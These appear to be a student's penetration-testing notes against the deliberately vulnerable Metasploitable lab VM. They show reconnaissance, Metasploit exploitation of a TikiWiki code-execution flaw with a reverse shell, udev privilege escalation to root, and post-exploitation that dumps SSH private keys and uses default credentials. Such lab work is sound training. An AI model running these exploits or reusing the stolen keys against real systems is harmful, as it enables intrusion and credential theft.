@@ -1,0 +1,294 @@
+Step 1 - IG
+-----
+ 
+Nmap Scan Metasploitable:
+nmap -sV -O -oA nmap 192.168.122.126
+
+Check Tikiwiki:
+http://192.168.122.126/tikiwiki/tiki-index.php
+
+Nikto Scan:
+nikto -h 192.168.122.126 > nikto.txt
+
+Found Using Nikto:
+
+-> + /tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://blog.cirt.net/rfiinc.txt: TikiWiki contains a vulnerability which allows remote attackers to execute arbitrary PHP code. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5423
+
+Step 2 - Exploitation
+-----
+
+msfconsole
+
+msf6 > search tikiwiki
+
+-> Results:
+   5  exploit/unix/webapp/tikiwiki_graph_formula_exec  2007-10-10       excellent  Yes    TikiWiki tiki-graph_formula Remote PHP Code Execution
+
+msf6 > use exploit/unix/webapp/tikiwiki_graph_formula_exec
+
+show options
+->
+set RHOSTS 192.168.122.126
+
+show payloads
+->
+set payload payload/generic/shell_reverse_tcp
+
+show options
+-> Check LHOST
+
+exploit
+
+
+Step 3 - Shell Access / Local Privilege Escalation
+-----
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@metasploitable:/var/www/tikiwiki$ 
+
+uname -a
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+
+cat /proc/version
+Linux version 2.6.24-16-server (buildd@palmer) (gcc version 4.2.3 (Ubuntu 4.2.3-2ubuntu7)) #1 SMP Thu Apr 10 13:58:00 UTC 2008
+
+searchsploit -w Linux 2.6
+
+Linux Kernel 2.6 (Gentoo / Ubuntu 8.10/9.04) UDEV < 1.4.1 - Local Privilege Escalation (2)                     | https://www.exploit-db.com/exploits/8572
+
+
+msf6 > search UDEV
+
+   0  exploit/linux/local/udev_netlink  2009-04-16       great  No     Linux udev Netlink Local Privilege Escalation
+
+
+msf6 > use exploit/linux/local/udev_netlink
+
+show options
+
+set SESSION 20
+
+sessions -i
+
+sessions -i 20
+
+cat /proc/net/netlink
+
+2693
+
+cat /proc/net/netlink
+sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
+f7c50600 0   0      00000000 0        0        00000000 2
+f7d27a00 4   0      00000000 0        0        00000000 2
+df80a200 7   0      00000000 0        0        00000000 2
+f7d6c600 9   0      00000000 0        0        00000000 2
+f7d42c00 10  0      00000000 0        0        00000000 2
+f7447200 15  2693   00000001 0        0        00000000 2
+f7c50a00 15  0      00000000 0        0        00000000 2
+f7d40200 16  0      00000000 0        0        00000000 2
+f741e000 18  0      00000000 0        0        00000000 2
+
+
+
+show options
+
+set SESSION 10
+
+set NetlinkPID 2693
+
+exploit
+
+
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session architecture: php
+[!]  * incompatible session platform: php
+[*] Started reverse TCP handler on 192.168.122.31:4444 
+[+] Found netlink pid: 2693
+[*] Writing payload executable (207 bytes) to /tmp/FKjdEEIuXw
+[*] Writing exploit executable (1879 bytes) to /tmp/nnkqvsywwc
+[*] chmod'ing and running it...
+[*] Sending stage (1017704 bytes) to 192.168.122.126
+[*] Meterpreter session 185 opened (192.168.122.31:4444 -> 192.168.122.126:46476) at 2023-08-09 17:04:28 +0100
+
+meterpreter > sysinfo
+Computer     : metasploitable.localdomain
+OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
+Architecture : i686
+BuildTuple   : i486-linux-musl
+Meterpreter  : x86/linux
+meterpreter > getuid
+Server username: root
+meterpreter > shell
+Process 6470 created.
+Channel 1 created.
+id
+uid=0(root) gid=0(root)
+ifconfig
+eth0      Link encap:Ethernet  HWaddr 52:54:00:8e:5f:39  
+          inet addr:192.168.122.126  Bcast:192.168.122.255  Mask:255.255.255.0
+          inet6 addr: fe80::5054:ff:fe8e:5f39/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:23809 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:24404 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:7031090 (6.7 MB)  TX bytes:14183871 (13.5 MB)
+          Base address:0xc000 Memory:fc040000-fc060000 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:360 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:360 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:167143 (163.2 KB)  TX bytes:167143 (163.2 KB)
+
+
+meterpreter > ipconfig
+
+Interface  1
+============
+Name         : lo
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 16436
+Flags        : UP,LOOPBACK
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::
+
+
+Interface  2
+============
+Name         : eth0
+Hardware MAC : 52:54:00:8e:5f:39
+MTU          : 1500
+Flags        : UP,BROADCAST,MULTICAST
+IPv4 Address : 192.168.122.126
+IPv4 Netmask : 255.255.255.0
+IPv6 Address : fe80::5054:ff:fe8e:5f39
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+
+meterpreter > ls
+Listing: /home/user/.ssh
+========================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100600/rw-------  668   fil   2010-05-07 19:36:34 +0100  id_dsa
+100644/rw-r--r--  609   fil   2010-05-07 19:36:34 +0100  id_dsa.pub
+
+meterpreter > cat id_dsa
+-----BEGIN DSA PRIVATE KEY-----
+MIIBugIBAAKBgQDVoHGx78RdmEV9IE4s8qGWs8x4lOfut4ShTocyXIfHWUKRVOYB
+pA5Gd9KwuI6zaglzQzedEQOMpXDbTu/AfyOPuWAmd/X2kolyKC34vLTlVrU7YN5Z
+Lr93kldM7khnqmTxzLXqeoos0AOcqApZAso/LMFx/nDwRubkT4l2C/ddawIVAMv6
+kqsvLq/L0cLLBdZn+Nw+k8cRAoGAILfnDd3w09UUQmM/1Zqn1LKluI7WdOpL8dy/
+Nk9mdWFXl3u/dvSVnrvXdzgfjXhPBKKTIlmk2U9FiPjpM8UgBsrk7JLnuJ7xgn8Z
+w6+fMWtaWXEjuukeYwkgETB1OlgViHdzGM7CTWakzeLqEWuLSBcDPF/fStFFFZi7
+zWzwchACgYBNfKRDwM/QnEpdRTTsRBh9rALq6eDbLNbu/5gozf4Fv1Dt1Zmq5Zxt
+XeQtW5BYyorILRZ5/Y4pChRa01bxTRSJah0RJk5wxAUPZ282N07fzcJyVlBojMvP
+lbAplpSiecCuLGX7G04Ie8SFzT+wCketP9Vrw0PvtUZU3DfrVTCytgIUcihlgVO0
+XcyqKVITUMZyayEOuIE=
+-----END DSA PRIVATE KEY-----
+meterpreter > cat id_dsa.pub 
+ssh-dss AAAAB3NzaC1kc3MAAACBANWgcbHvxF2YRX0gTizyoZazzHiU5+63hKFOhzJch8dZQpFU5gGkDkZ30rC4jrNqCXNDN50RA4ylcNtO78B/I4+5YCZ39faSiXIoLfi8tOVWtTtg3lkuv3eSV0zuSGeqZPHMtep6iizQA5yoClkCyj8swXH+cPBG5uRPiXYL911rAAAAFQDL+pKrLy6vy9HCywXWZ/jcPpPHEQAAAIAgt+cN3fDT1RRCYz/VmqfUsqW4jtZ06kvx3L82T2Z1YVeXe7929JWeu9d3OB+NeE8EopMiWaTZT0WI+OkzxSAGyuTskue4nvGCfxnDr58xa1pZcSO66R5jCSARMHU6WBWId3MYzsJNZqTN4uoRa4tIFwM8X99K0UUVmLvNbPByEAAAAIBNfKRDwM/QnEpdRTTsRBh9rALq6eDbLNbu/5gozf4Fv1Dt1Zmq5ZxtXeQtW5BYyorILRZ5/Y4pChRa01bxTRSJah0RJk5wxAUPZ282N07fzcJyVlBojMvPlbAplpSiecCuLGX7G04Ie8SFzT+wCketP9Vrw0PvtUZU3DfrVTCytg== user@metasploitable
+meterpreter > 
+
+meterpreter > ls
+Listing: /home/msfadmin/.ssh
+============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100644/rw-r--r--  609   fil   2010-05-07 19:38:35 +0100  authorized_keys
+100600/rw-------  1675  fil   2010-05-18 02:43:18 +0100  id_rsa
+100644/rw-r--r--  405   fil   2010-05-18 02:43:18 +0100  id_rsa.pub
+
+meterpreter > cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEoQIBAAKCAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqld
+JkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qO
+ffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5
+JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9I
+yhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7b
+wkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3wIBIwKCAQBaUjR5bUXnHGA5fd8N
+UqrUx0zeBQsKlv1bK5DVm1GSzLj4TU/S83B1NF5/1ihzofI7OAQvlCdUY2tHpGGa
+zQ6ImSpUQ5i9+GgBUOaklRL/i9cHdFv7PSonW+SvF1UKY5EidEJRb/O6oFgB5q8G
+JKrwu+HPNhvD+dliBnCn0JU+Op/1Af7XxAP814Rz0nZZwx+9KBWVdAAbBIQ5zpRO
+eBBlLSGDsnsQN/lG7w8sHDqsSt2BCK8c9ct31n14TK6HgOx3EuSbisEmKKwhWV6/
+ui/qWrrzurXA4Q73wO1cPtPg4sx2JBh3EMRm9tfyCCtB1gBi0N/2L7j9xuZGGY6h
+JETbAoGBANI8HzRjytWBMvXh6TnMOa5S7GjoLjdA3HXhekyd9DHywrA1pby5nWP7
+VNP+ORL/sSNl+jugkOVQYWGG1HZYHk+OQVo3qLiecBtp3GLsYGzANA/EDHmYMUSm
+4v3WnhgYMXMDxZemTcGEyLwurPHumgy5nygSEuNDKUFfWO3mymIXAoGBAMqZi3YL
+zDpL9Ydj6JhO51aoQVT91LpWMCgK5sREhAliWTWjlwrkroqyaWAUQYkLeyA8yUPZ
+PufBmrO0FkNa+4825vg48dyq6CVobHHR/GcjAzXiengi6i/tzHbA0PEai0aUmvwY
+OasZYEQI47geBvVD3v7D/gPDQNoXG/PWIPt5AoGBAMw6Z3S4tmkBKjCvkhrjpb9J
+PW05UXeA1ilesVG+Ayk096PcV9vngvNpLdVAGi+2jtHuCQa5PEx5+DLav8Nriyi2
+E5l35bqoiilCQ83PriCAMpL49iz6Pn00Z3o+My1ZVJudQ5qhjVznY+oBdM3DNpAE
+xn6yeL+DEiI/XbPngsWvAoGAbfuU2a6iEQSp28iFlIKa10VlS2U493CdzJg0IWcF
+2TVjoMaFMcyZQ/pzt9B7WQY7hodl8aHRsQKzERieXxQiKSxuwUN7+3K4iVXxuiGJ
+BMndK+FYbRpEnaz591K6kYNwLaEg70BZ0ek0QjC2Ih7t1ZnfdFvEaHFPF05foaAg
+iIMCgYAsNZut02SC6hwwaWh3Uxr07s6jB8HyrET0v1vOyOe3xSJ9YPt7c1Y20OQO
+Fb3Yq4pdHm7AosAgtfC1eQi/xbXP73kloEmg39NZAfT3wg817FXiS2QGHXJ4/dmK
+94Z9XOEDocClV7hr9H//hoO8fV/PHXh0oFQvw1d+29nf+sgWDg==
+-----END RSA PRIVATE KEY-----
+meterpreter > cat id_rsa.pub 
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable
+meterpreter > 
+
+
+meterpreter > search -f *.doc
+Found 1 result...
+=================
+
+Path                        Size (bytes)  Modified (UTC)
+----                        ------------  --------------
+/usr/lib/python2.5/pdb.doc  7483          2010-01-20 23:04:18 +0000
+
+meterpreter > download /usr/lib/python2.5/pdb.doc
+[*] Downloading: /usr/lib/python2.5/pdb.doc -> /home/kali/Documents/Metasploitable 1/Day 2/pdb.doc
+[*] Downloaded 7.31 KiB of 7.31 KiB (100.0%): /usr/lib/python2.5/pdb.doc -> /home/kali/Documents/Metasploitable 1/Day 2/pdb.doc
+[*] Completed  : /usr/lib/python2.5/pdb.doc -> /home/kali/Documents/Metasploitable 1/Day 2/pdb.doc
+meterpreter > 
+
+pwd
+/
+
+ls
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd
+initrd.img
+lib
+lost+found
+media
+mnt
+opt
+proc
+root
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+
+cd home 
+ls
+ftp
+msfadmin
+service
+user
+
+telnet 192.168.122.126
+
+Username: msfadmin
+Password: msfadmin
